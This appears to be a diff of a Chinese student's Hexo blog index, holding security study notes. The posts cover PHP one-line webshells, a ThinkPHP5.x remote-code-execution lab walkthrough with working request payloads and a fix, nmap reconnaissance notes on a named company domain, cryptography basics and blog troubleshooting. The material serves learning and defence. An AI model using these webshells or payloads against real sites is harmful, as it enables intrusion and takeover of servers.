+    <content><![CDATA[<h4 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h4><h5 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h5><p>最简单的一句话：<?php @eval($_POST['attack']);?></p>
+<p>​                                <?php @eval($_POST['mima']);?></p>
+<p>​                                <?php @eval($_POST['muma']);?></p>
+<h5 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h5><p>​        利用文件上传漏洞，往目标网站中上传一句话木马，然后就可以在本地通过蚁剑即可获取和控制整个网站目录。</p>
+<p>​        @表示后面即使执行错误，也不报错。<strong>eval（）函数</strong>表示括号内的语句字符串什么/.的全都当做代码执行。$_POST[‘attack’]表示从页面中获得attack这个参数值。（也就是[‘     ‘]里的数值可以改变，作为密码）</p>
+<h5 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h5><p>​                    （1）木马上传成功，未被杀；<br>​                    （2）知道木马的路径在哪；<br>​                    （3）上传的木马能正常运行。</p>
+]]></content>
+      <tags>
+        <tag>php</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ThiThinkPHP5.x 远程函数执行与sql注入</title>
+    <url>/2021/07/18/src/ThinkPHP5/</url>
+    <content><![CDATA[<p>实验地址：<a href="https://www.anquanlong.com/lab_detail?lab_id=4&lib=5">ThinkPHP5.x 远程函数执行与sql注入_安全龙-专注做企业网络安全服务与网络安全培训! (anquanlong.com)</a></p>
+<p>知识梳理：</p>
+<p><strong>PoC</strong>，全称“Proof of Concept”，中文“概念验证”，常指一段漏洞证明的代码。</p>
+<p><strong>Exp</strong>，全称“Exploit”，中文“利用”，指利用系统漏洞进行攻击的动作。</p>
+<p><strong>Payload</strong>，中文“有效载荷”，指成功 exploit 之后，真正在目标系统执行的代码或指令。</p>
+<p><strong>Shellcode</strong>，简单翻译“shell 代码”，是 Payload 的一种，由于其建立正向/反向 shell 而得名。</p>
+<p>（用蚁剑连上之后，发现这是安全龙部署在阿里云上的环境）</p>
+<p><img src="/2021/07/18/src/ThinkPHP5/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(280).png"></p>
+<p>​    首先尝试了远程函数漏洞的初始语句：</p>
+<p><code>?s=index/\think\app/invokefunction&amp;function=system&amp;return_value=&amp;command=</code></p>
+<p><code>可执行Linux命令</code></p>
+<p><img src="/2021/07/18/src/ThinkPHP5/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(281).png"></p>
+<p>然后我们按照提示去写入一个文件，phpinfo的功能</p>
+<p>利用到了file_put_contents函数（POC分析）</p>
+<p><code>?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=./test.php&amp;vars[1][]=&lt;?php%20phpinfo();?&gt;</code></p>
+<p><img src="/2021/07/18/src/ThinkPHP5/image-20210718191745523.png" alt="image-20210718191745523"></p>
+<p>回显出了数字18，表示我们写入文件成功</p>
+<p>接着进行访问</p>
+<p>test.php</p>
+<p><img src="/2021/07/18/src/ThinkPHP5/image-20210718191940910.png" alt="image-20210718191940910"></p>
+<p>出现如上页面，成功利用漏洞。</p>
+<p>接着我还尝试了一句话木马的写入，答案显然，也是可以写入并利用的。</p>
+<p>最后蚁剑连接即可。</p>
+<p><img src="/2021/07/18/src/ThinkPHP5/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(284).png"></p>
+<p><img src="/2021/07/18/src/ThinkPHP5/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(285).png"></p>
+<p><img src="/2021/07/18/src/ThinkPHP5/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(286).png"></p>
+<p><img src="/2021/07/18/src/ThinkPHP5/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(287).png"></p>
+<p>利用完漏洞，对于我们来说最重要的学会去修复</p>
+<p>接下来学习修复这个漏洞</p>
+<p>1.添加一段代码到App.php的554行</p>
+<p><code>if (!preg_match(&#39;/^[A-Za-z](\w)*$/&#39;, $controller)) &#123;</code></p>
+<p><code>            throw new HttpException(404, &#39;controller not exists:&#39; . $controller);</code></p>
+<p><code>        &#125;</code></p>
+<p><img src="/2021/07/18/src/ThinkPHP5/image-20210718193014082.png" alt="image-20210718193014082"></p>
+<p>修改之后，使用原来的poc发现失效了</p>
+<p>漏洞修复成功。</p>
+<p><img src="/2021/07/18/src/ThinkPHP5/image-20210718193101116.png" alt="image-20210718193101116"></p>
+]]></content>
+      <tags>
+        <tag>漏洞复现</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>goktech</title>
+    <url>/2021/01/31/x/goktech/</url>
+    <content><![CDATA[<h2 id="渗透测试思路"><a href="#渗透测试思路" class="headerlink" title="渗透测试思路"></a>渗透测试思路</h2><p>1． 信息收集</p>
+<p>2． 漏洞挖掘</p>
+<p>3． 漏洞利用</p>
+<p>4． 输出渗透测试报告</p>
+<p>信息收集：</p>
+<p>1.</p>
+<p>基本信息：</p>
+<p>域名信息 : goktech.cn</p>
+<p>子域名: 子域名挖掘机.exe  :bbs.goktech.cn   phpinfo,me</p>
+<p>ip地址：站长之家</p>
+<p>同ip地址的其他网站信息</p>
+<p>端口 80(http）443(https)</p>
+<p>服务，服务版本（web服务） 同网段的其他服务器信息（c段）</p>
+<p>信息泄露，GitHub.com 如qq.com user pass</p>
+<p>网站目录：御剑</p>
+<p>2.</p>
+<p>Os操作系统</p>
+<p>Linux windows mac等</p>
+<p>3.</p>
+<p>  Web中间件（web程序，用来提供网页服务）</p>
+<p>类型、版本：iis，apache，nginx，weblogic</p>
+<p>4.</p>
+<p>  数据库</p>
+<p>类型、版本：MySQL、mssql、Oracle、access</p>
+<p>5.</p>
+<p> 后编的脚本类型</p>
+<h3 id="Linux的指令"><a href="#Linux的指令" class="headerlink" title="Linux的指令"></a>Linux的指令</h3><p>ifconfig—查看ip地址</p>
+<p>dhclient—重新获取地址</p>
+<h4 id="namp-诸神之眼"><a href="#namp-诸神之眼" class="headerlink" title="namp,诸神之眼"></a>namp,诸神之眼</h4><p>#  namp -sS -p 80,443 10.10.10.1 -O</p>
+<p>-p 迅速扫描指定的端口</p>
+<p>-F  快速扫描100个常用的端口</p>
+<p>-r  顺序扫描，按从小到大的顺序进行端口扫描</p>
+<p>其他常用选项</p>
+<p>-sV 检测服务端软件版本信息</p>
+<p>-O  检测操作系统信息</p>
+<p>-Pn 禁用namp的主机检测功能</p>
+<p>-A 探测服务版本、对操作系统进行识别、进行脚本扫描、进行路由探测</p>
+<p><img src="http://rongcloud-web.qiniudn.com/docs_demo_rongcloud_logo.png"></p>
+]]></content>
+      <tags>
+        <tag>分享会</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Hello World</title>
+    <url>/2020/11/05/x/hello-world/</url>
+    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>博客解疑</title>
+    <url>/2020/10/15/x/%E5%8D%9A%E5%AE%A2%E8%A7%A3%E7%96%91/</url>
+    <content><![CDATA[<h3 id="当输入hexo-g发布博文并预览时出现下面的提示："><a href="#当输入hexo-g发布博文并预览时出现下面的提示：" class="headerlink" title="当输入hexo -g发布博文并预览时出现下面的提示："></a>当输入hexo -g发布博文并预览时出现下面的提示：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">YAMLException: can not read a block mapping entry; a multiline key may not be an implicit key at line x, column y:</span><br><span class="line">1</span><br></pre></td></tr></table></figure>
+
+<p>报错信息是提示hexo的yml配置文件 冒号后面少了空格 解决方案：到提示行将对应的空格补上即可。</p>
+<h4 id="补充："><a href="#补充：" class="headerlink" title="补充："></a>补充：</h4><p>如果标题用诸如[网鼎杯] 2020 青龙组AreUSerialz的时候，会出现报错</p>
+<p>原因猜测为hexo标题默认加上了[ ],我们再次添加这个符号就会产生报错。</p>
+<h3 id="hexo-s-时出现报错"><a href="#hexo-s-时出现报错" class="headerlink" title="hexo -s 时出现报错"></a>hexo -s 时出现报错</h3><p>Port 4000 has been used. Try other port instead.</p>
+<p>分析了一下，应该是我恰巧同时使用PHP study和hexo静态页面，所以占用了端口，查找文章获得方法：</p>
+<p>可以在站点下的文件_config.yml内加上如下代码更改hexo-server运行时的端口号：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">server:</span><br><span class="line">  port: 4001 #端口号随意，默认是4000</span><br><span class="line">  compress: true</span><br><span class="line">  header: true</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="About-photograph"><a href="#About-photograph" class="headerlink" title="About photograph"></a>About photograph</h3><p>今天再次尝试博客上传图片（好吧，都是因为之前自己不断失败，苦笑ing）</p>
+<p>重新看了下csdn上一篇好文章</p>
+<p>附上链接：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;blog.csdn.net&#x2F;xjm850552586&#x2F;article&#x2F;details&#x2F;84101345?ops_request_misc&#x3D;%25257B%252522request%25255Fid%252522%25253A%252522161371871416780266219548%252522%25252C%252522scm%252522%25253A%25252220140713.130102334..%252522%25257D&amp;request_id&#x3D;161371871416780266219548&amp;biz_id&#x3D;0&amp;utm_medium&#x3D;distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-84101345.pc_search_result_before_js&amp;utm_term&#x3D;hexo%25E5%259B%25BE%25E7%2589%2587</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>之后本地只需在文件的相同名文件夹下保存图片，然后markdown编辑时直接添加图片即可啦。</p>
+<p>注意：文章和同名文件夹需要在同一目录下，否则会显示丢失路径。</p>
+<h3 id="burp-intruder爆破出现-Payload-set-1-Invalid-number-settings的解决办法"><a href="#burp-intruder爆破出现-Payload-set-1-Invalid-number-settings的解决办法" class="headerlink" title="burp intruder爆破出现 Payload set 1: Invalid number settings的解决办法"></a>burp intruder爆破出现 Payload set 1: Invalid number settings的解决办法</h3><p>如果点击start attrack 后出现 Payload set 1: Invalid number settings 的提示，先点hex 后点 decimal 再开始start attrack，这是一个软件bug，需要手动让它刷新。<br><img src="https://img-blog.csdnimg.cn/20190901085439370.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2ZqaDE5OTc=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20190901085447734.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2ZqaDE5OTc=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h3 id="Python数据可视化利器Matplotlib，无法显示中文，怎么办？"><a href="#Python数据可视化利器Matplotlib，无法显示中文，怎么办？" class="headerlink" title="Python数据可视化利器Matplotlib，无法显示中文，怎么办？"></a>Python数据可视化利器Matplotlib，无法显示中文，怎么办？</h3><p><a href="https://zhuanlan.zhihu.com/p/104081310?utm_source=wechat_timeline">彻底解决Python里matplotlib不显示中文的问题 - 知乎 (zhihu.com)</a></p>
+<p>在自己的代码里加入如下代码：</p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">import matplotlib</span><br><span class="line">matplotlib.rc(&quot;font&quot;,family=&#x27;YouYuan&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p>解决<img src="/2020/10/15/x/%E5%8D%9A%E5%AE%A2%E8%A7%A3%E7%96%91/image-20210527201252662.png" alt="image-20210527201252662"></p>
+<h3 id="在使用phpstudy启动apache服务器时一直出现-PHP-startup-弹窗怎么办？"><a href="#在使用phpstudy启动apache服务器时一直出现-PHP-startup-弹窗怎么办？" class="headerlink" title="在使用phpstudy启动apache服务器时一直出现    PHP startup  弹窗怎么办？"></a>在使用phpstudy启动apache服务器时一直出现    PHP startup  弹窗怎么办？</h3><p><img src="/2020/10/15/x/%E5%8D%9A%E5%AE%A2%E8%A7%A3%E7%96%91/image-20210726111000310.png" alt="image-20210726111000310"></p>
+<p>上网查找后得知，这于php.ini配制文件有关</p>
+<p>1.对于里面的扩展文件，若目录下无文件需要用；加以关闭。</p>
+<p><img src="/2020/10/15/x/%E5%8D%9A%E5%AE%A2%E8%A7%A3%E7%96%91/image-20210726111308665.png" alt="image-20210726111308665"></p>
+<p>如图，这里的</p>
+<p>extension=php_xmlrpc.dll在对应文件夹里并没有，所以我们加上分号来关闭。</p>
+<p>2.路径的添加：</p>
+<p>打开php.ini，如找到extension_dir修改为：</p>
+<p><strong>extension_dir = “D:/Program/WAMP/php/ext”</strong></p>
+<p>引号内使用绝对路径即可。</p>
+]]></content>
+      <tags>
+        <tag>博客</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>密码学</title>
+    <url>/2020/10/18/x/%E5%AF%86%E7%A0%81%E5%AD%A6/</url>
+    <content><![CDATA[<p>密码：基本思想  伪装</p>
+<p>明文空间M 集合</p>
+<p>密文空间C  集合</p>
+<p>密钥空间K            Ke 加密钥   Kd 解密钥</p>
+<p>加密算法E：M—&gt;C</p>
+<p>解密算法D：C—-&gt;M   而且解密变换是加密变换的逆过程</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;img-blog.csdn.net&#x2F;20180831003945940?watermark&#x2F;2&#x2F;text&#x2F;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw&#x3D;&#x3D;&#x2F;font&#x2F;5a6L5L2T&#x2F;fontsize&#x2F;400&#x2F;fill&#x2F;I0JBQkFCMA&#x3D;&#x3D;&#x2F;dissolve&#x2F;70</span><br></pre></td></tr></table></figure>
+
+<p>共模<br>设a，b为正整数，如果用m分别除去a和b所得的余数相同，则称a和b关于模m同余<br>记作a=b<mod m><br>eg:1=27<mod26><br>(一个数除以比它大的数，余数为它本身）</mod26></mod></p>
+<p>密码学了解：</p>
+<p>1、<strong>对称密码算法</strong></p>
+<p>加密密钥和解密密钥相同（或者实质上等同，即从一个易推出另一个），</p>
+<p>• DES、3DES、IDEA、AES</p>
+<p>2、<strong>非对称密码算法</strong></p>
+<p>加密密钥和解密密钥不同，其中的加密密钥可以公开， 称为公开密钥，简称公钥；解密密钥必须保密，称为私人密钥，</p>
+<p>• RSA、ECC、ElGamal</p>
+<h3 id="3、编码方式"><a href="#3、编码方式" class="headerlink" title="3、编码方式"></a>3、<strong>编码方式</strong></h3><p>ASCII编码：ASCII在线转换地址：<a href="http://www.mokuge.com/tool/asciito16/">http://www.mokuge.com/tool/asciito16/</a></p>
+<h4 id="base家族编码"><a href="#base家族编码" class="headerlink" title="base家族编码"></a>base家族编码</h4><ul>
+<li>base2: 2进制</li>
+<li>base10: 10进制</li>
+<li>base16（HEX): 计算机字节表示，0<del>9，A</del>F，16位组成</li>
+<li>base32: 字母加数字，大写字母，234567,32位组成</li>
+<li>base64: 更大的表示范围,大小写字母，0~9，+，-,64位组成的。(做题时经常明显的等号==)</li>
+<li>base58: bitcoin为了比base64更易读采用的表示</li>
+</ul>
+<p>具体实现可以分为2种，能利用bit位直接转换的base(例如base2, base16,base32, base64),和不能利用bit位直接转换的base(例如base10, base58)。</p>
+<p><img src="/2020/10/18/x/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(182).png"></p>
+<p>关于base16，32，64的文章：<a href="https://blog.csdn.net/lili13897741554/article/details/82177472">https://blog.csdn.net/lili13897741554/article/details/82177472</a></p>
+<h4 id="misc的图形密码"><a href="#misc的图形密码" class="headerlink" title="misc的图形密码"></a>misc的图形密码</h4><p>（也是有关密码就记录在这里了）</p>
+<h5 id="1-猪圈密码"><a href="#1-猪圈密码" class="headerlink" title="1.猪圈密码"></a>1.猪圈密码</h5><p>这个应该很常见了（当然还包括很多变形</p>
+<p><img src="https://img-blog.csdnimg.cn/2020121317155637.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0FtaGVyc3RpZWFl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<h5 id="2-圣堂武士密码-猪圈变形1"><a href="#2-圣堂武士密码-猪圈变形1" class="headerlink" title="2.圣堂武士密码-猪圈变形1"></a>2.圣堂武士密码-猪圈变形1</h5><p><img src="https://img-blog.csdnimg.cn/20201213171645589.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0FtaGVyc3RpZWFl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<h5 id="3-猪圈变形2"><a href="#3-猪圈变形2" class="headerlink" title="3.猪圈变形2"></a>3.猪圈变形2</h5><p><img src="https://img-blog.csdnimg.cn/20201213171716955.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0FtaGVyc3RpZWFl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<h5 id="4-猪圈变形4"><a href="#4-猪圈变形4" class="headerlink" title="4.猪圈变形4"></a>4.猪圈变形4</h5><p><img src="https://img-blog.csdnimg.cn/20201213171957838.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0FtaGVyc3RpZWFl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<h5 id="5-宇宙的信号"><a href="#5-宇宙的信号" class="headerlink" title="5.宇宙的信号"></a>5.宇宙的信号</h5><p><img src="https://img-blog.csdnimg.cn/20201213172025785.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0FtaGVyc3RpZWFl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<h5 id="6-福尔摩斯跳舞的小人"><a href="#6-福尔摩斯跳舞的小人" class="headerlink" title="6.福尔摩斯跳舞的小人"></a>6.福尔摩斯跳舞的小人</h5><p>有拿旗子和不拿旗子两种</p>
+<p><img src="https://img-blog.csdnimg.cn/20201213172051787.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0FtaGVyc3RpZWFl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<h5 id="7-a-z是顺序来的"><a href="#7-a-z是顺序来的" class="headerlink" title="7.a-z是顺序来的"></a>7.a-z是顺序来的</h5><p><img src="https://img-blog.csdnimg.cn/20201213172133298.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0FtaGVyc3RpZWFl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<h5 id="8-古埃及象形文字"><a href="#8-古埃及象形文字" class="headerlink" title="8.古埃及象形文字"></a>8.古埃及象形文字</h5><p><img src="https://img-blog.csdnimg.cn/20201213172239642.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0FtaGVyc3RpZWFl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<h5 id="9-古精灵语"><a href="#9-古精灵语" class="headerlink" title="9.古精灵语"></a>9.古精灵语</h5><p>字母<br>数字</p>
+<p><img src="https://img-blog.csdnimg.cn/20201213172259135.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0FtaGVyc3RpZWFl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<h5 id="10-神奇宝贝鸟图腾"><a href="#10-神奇宝贝鸟图腾" class="headerlink" title="10.神奇宝贝鸟图腾"></a>10.神奇宝贝鸟图腾</h5><p><img src="https://img-blog.csdnimg.cn/20201213172434844.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0FtaGVyc3RpZWFl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<h5 id="11-阿雷西博射电望远镜用二进制表示1-10数字"><a href="#11-阿雷西博射电望远镜用二进制表示1-10数字" class="headerlink" title="11.阿雷西博射电望远镜用二进制表示1-10数字"></a>11.阿雷西博射电望远镜用二进制表示1-10数字</h5><p><img src="https://img-blog.csdnimg.cn/20201213172805434.png#pic_center" alt="在这里插入图片描述"></p>
+<h5 id="12-盲文"><a href="#12-盲文" class="headerlink" title="12.盲文"></a>12.盲文</h5><p>这里只有英文字母和数字，当然声母韵母声调等还是 不一样的。</p>
+<p><img src="https://img-blog.csdnimg.cn/20201213172831531.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0FtaGVyc3RpZWFl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/2020121317322193.png#pic_center" alt="在这里插入图片描述"></p>
+<h5 id="13-音符加密"><a href="#13-音符加密" class="headerlink" title="13.音符加密"></a>13.音符加密</h5><p><img src="https://img-blog.csdnimg.cn/20201213173240570.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0FtaGVyc3RpZWFl,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/20201213173240509.JPG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0FtaGVyc3RpZWFl,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/20201213173240489.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0FtaGVyc3RpZWFl,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h5 id="14-天干地支"><a href="#14-天干地支" class="headerlink" title="14.天干地支"></a>14.天干地支</h5><p><img src="https://img-blog.csdnimg.cn/20201213173309635.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0FtaGVyc3RpZWFl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<h5 id="15-搜狗软键盘"><a href="#15-搜狗软键盘" class="headerlink" title="15.搜狗软键盘"></a>15.搜狗软键盘</h5><p><img src="https://img-blog.csdnimg.cn/20210112163836195.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0FtaGVyc3RpZWFl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>原文链接：<a href="https://blog.csdn.net/Amherstieae/article/details/111134283">https://blog.csdn.net/Amherstieae/article/details/111134283</a></p>
+<h5 id="星座密码"><a href="#星座密码" class="headerlink" title="星座密码"></a>星座密码</h5><p><img src="/2020/10/18/x/%E5%AF%86%E7%A0%81%E5%AD%A6/image-20210531213925718.png" alt="image-20210531213925718"></p>
+]]></content>
+      <tags>
+        <tag>cryptography</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>other 一些 information</title>
+    <url>/2020/11/05/x/%E8%AF%BE%E7%A8%8B/</url>
+    <content><![CDATA[<h4 id="fafu学长讲课记录的："><a href="#fafu学长讲课记录的：" class="headerlink" title="fafu学长讲课记录的："></a>fafu学长讲课记录的：</h4><p>Web安全</p>
+<p>crypto：矩阵，数论，密码学</p>
+<p>dvwa平台</p>
+<h5 id="html的常见标签"><a href="#html的常见标签" class="headerlink" title="html的常见标签"></a>html的常见标签</h5><ul>
+<li><ul>
+<li><strong><!DOCTYPE html></strong> 声明为 HTML5 文档</li>
+<li><strong><html></html></strong> 元素是 HTML 页面的根元素</li>
+<li><strong><head></head></strong> 元素包含了文档的元（meta）数据，如 <strong><meta charset="utf-8"></strong> 定义网页编码格式为 <strong>utf-8</strong>。</li>
+<li><strong><title></title></strong> 元素描述了文档的标题</li>
+<li><strong><body></body></strong> 元素包含了可见的页面内容</li>
+<li><strong><h1></h1></strong> 元素定义一个大标题</li>
+<li><strong><p></p></strong> 元素定义一个段落</li>
+<li>HTML      标签通常是<em>成对出现</em>的，比如 <b> 和      </b></li>
+<li>标签对中的第一个标签是<em>开始标签</em>，第二个标签是<em>结束标签</em></li>
+</ul>
+</li>
+</ul>
+<h5 id="HTML-网页结构"><a href="#HTML-网页结构" class="headerlink" title="HTML 网页结构"></a><strong>HTML 网页结构</strong></h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">下面是一个可视化的HTML页面结构：</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line"></span><br><span class="line">&lt;title&gt;页面标题&lt;&#x2F;title&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;h1&gt;这是一个标题&lt;&#x2F;h1&gt;</span><br><span class="line"></span><br><span class="line">&lt;p&gt;这是一个段落。&lt;&#x2F;p&gt;</span><br><span class="line"></span><br><span class="line">&lt;p&gt;这是另外一个段落。&lt;&#x2F;p&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="大佬讲课"><a href="#大佬讲课" class="headerlink" title="大佬讲课"></a>大佬讲课</h4><p><img src="/2020/11/05/x/%E8%AF%BE%E7%A8%8B/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(170).png"></p>
+<p><img src="/2020/11/05/x/%E8%AF%BE%E7%A8%8B/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(171).png"></p>
+<p><img src="/2020/11/05/x/%E8%AF%BE%E7%A8%8B/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(172).png"></p>
+<p><img src="/2020/11/05/x/%E8%AF%BE%E7%A8%8B/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(173).png"><img src="/2020/11/05/x/%E8%AF%BE%E7%A8%8B/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(177).png"><img src="/2020/11/05/x/%E8%AF%BE%E7%A8%8B/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(179).png"></p>
+<p><img src="/2020/11/05/x/%E8%AF%BE%E7%A8%8B/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(180).png"></p>
+<p><img src="/2020/11/05/x/%E8%AF%BE%E7%A8%8B/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(181).png"></p>
+]]></content>
+      <tags>
+        <tag>分享会</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>mixed</title>
+    <url>/2021/02/01/web/mixed/</url>
+    <content><![CDATA[<h4 id="xss："><a href="#xss：" class="headerlink" title="xss："></a>xss：</h4><p>人们经常将跨站脚本攻击（Cross Site Scripting）缩写为CSS，但这会与层叠样式表（Cascading Style Sheets，CSS）的缩写混淆。因此，有人将跨站脚本攻击缩写为XSS。</p>
+<h4 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h4><p>Sqlmap -r后面跟着文件</p>
+<p>Sqlmap -u后面跟着路径（url）</p>
